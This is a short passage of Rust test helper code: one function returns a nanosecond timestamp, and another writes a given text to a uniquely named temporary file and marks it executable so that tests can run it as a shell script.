    fn nanoid_counter() -> u64 {
        use std::time::{SystemTime, UNIX_EPOCH};
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0)
    }

    #[cfg(unix)]
    fn create_test_script(label: &str, contents: &str) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;

        let path = std::env::temp_dir().join(format!(
            "echo-shell-stream-{label}-{}-{}",
            std::process::id(),
            nanoid_counter()
        ));
        std::fs::write(&path, contents).unwrap();
        let mut permissions = std::fs::metadata(&path).unwrap().permissions();
        permissions.set_mode(0o700);
        std::fs::set_permissions(&path, permissions).unwrap();
        path
    }
}
